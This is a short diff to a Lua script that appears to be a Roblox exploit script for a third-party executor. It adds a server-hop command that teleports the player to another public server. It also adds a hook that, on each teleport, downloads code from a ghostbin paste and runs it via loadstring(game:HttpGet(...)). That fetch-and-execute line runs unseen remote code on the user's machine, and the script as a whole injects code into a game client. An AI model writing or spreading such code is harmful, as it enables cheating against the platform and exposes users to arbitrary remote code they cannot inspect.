@@ -34,6 +34,19 @@ end
 end
 
 
+if command == "x!serverhop" then
+    
+	local x = {}
+	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
+		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
+			x[#x + 1] = v.id
+		end
+	end
+	if #x > 0 then
+		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
+	end
+end
+
 if command == "x!unlogspam" then
 someonelogspam = false
 
@@ -154,6 +167,10 @@ end
 
 
 end)
+end
+
+if syn then
+syn.queue_on_teleport('loadstring(game:HttpGet("https://ghostbin.co/paste/66zd9/raw",true))()')
 end
 
  game.StarterGui:SetCore("SendNotification", {
